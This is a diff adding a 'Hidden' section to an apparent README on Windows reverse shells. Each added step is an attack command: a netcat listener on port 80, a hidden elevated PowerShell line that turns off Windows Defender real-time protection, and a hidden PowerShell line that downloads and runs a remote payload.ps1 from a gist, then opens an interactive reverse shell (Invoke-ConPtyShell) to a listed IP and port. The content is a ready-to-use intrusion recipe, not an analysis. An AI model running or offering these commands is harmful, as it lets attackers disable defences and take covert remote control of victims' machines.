@@ -22,3 +22,18 @@ https://gist.githubusercontent.com/virejdasani/22573dcff0186f1b711613eb6de906ae/
 
 ## From this video
 https://www.youtube.com/watch?v=A2JNBpUotZM
+
+## Hidden
+### Server side
+```bash
+nc -lp 80
+```
+### Client side
+- Disable windows defender
+```ps1
+powershell -w hidden start powershell -A 'Set-MpPreference -DisableRea $true' -V runAs
+```
+- Load the script and listen on the ip and port numbers specified
+```
+powershell -w hidden "IEX(IWR https://gist.githubusercontent.com/virejdasani/22573dcff0186f1b711613eb6de906ae/raw/76a062b356b3e2846f3625f1cb3ec6430621f840/payload.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.29.21 80"
+```
